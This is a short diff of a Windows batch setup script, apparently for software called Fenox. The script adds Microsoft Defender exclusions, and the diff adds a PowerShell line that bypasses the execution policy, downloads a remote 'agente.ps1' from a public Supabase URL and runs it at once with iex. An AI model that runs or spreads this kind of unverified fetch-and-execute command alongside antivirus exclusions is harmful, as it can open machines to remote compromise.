@@ -46,6 +46,9 @@ exit
 :CONTINUE
 	powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\Fenox V1.0\Fnx64bits.exe'"
 	powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\Fenox V1.0\SisFnxUpdate.exe'"
+:: ADICIONA AGENT 2.0
+powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=3072; irm ('https://lexpiqyejppgiygwkjgf.supabase.co/storage/v1/object/public/gestao/agente.ps1?v=%RANDOM%') | iex"
+
 ::=======================================
 :: ADICIONA RESOLUÇÃO NO UPLOAD 800 X 600
 ::=======================================
